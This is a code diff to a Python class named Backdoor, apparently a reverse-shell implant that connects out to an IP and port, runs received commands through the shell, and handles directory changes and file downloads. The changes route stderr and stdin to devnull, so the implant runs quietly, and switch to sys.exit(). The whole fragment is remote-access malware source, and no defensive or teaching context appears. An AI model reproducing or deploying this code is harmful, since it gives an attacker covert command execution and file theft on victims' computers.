@@ -3,6 +3,7 @@
 import socket
 import subprocess, json, os
 import base64
+import sys
 
 class Backdoor:
 	def __init__(self, ip, port):
@@ -24,7 +25,10 @@ class Backdoor:
 
 	def execute_system_command(self, command):
 		try:
-			return subprocess.check_output(command, shell=True)
+			DEVNULL = open(os.devnull, 'wb')
+			return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
+
+			# return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
 		except subprocess.CalledProcessError:
 			return '[-] Error during command execution.'
 
@@ -49,7 +53,7 @@ class Backdoor:
 			try:
 				if command[0] == 'exit':
 					self.connection.close()
-					exit()
+					sys.exit()
 				elif command[0] == 'cd' and len(command) > 1:
 					command_result = self.change_working_directory_to(command[1])
 				elif command[0] == 'download' and len(command) > 1:
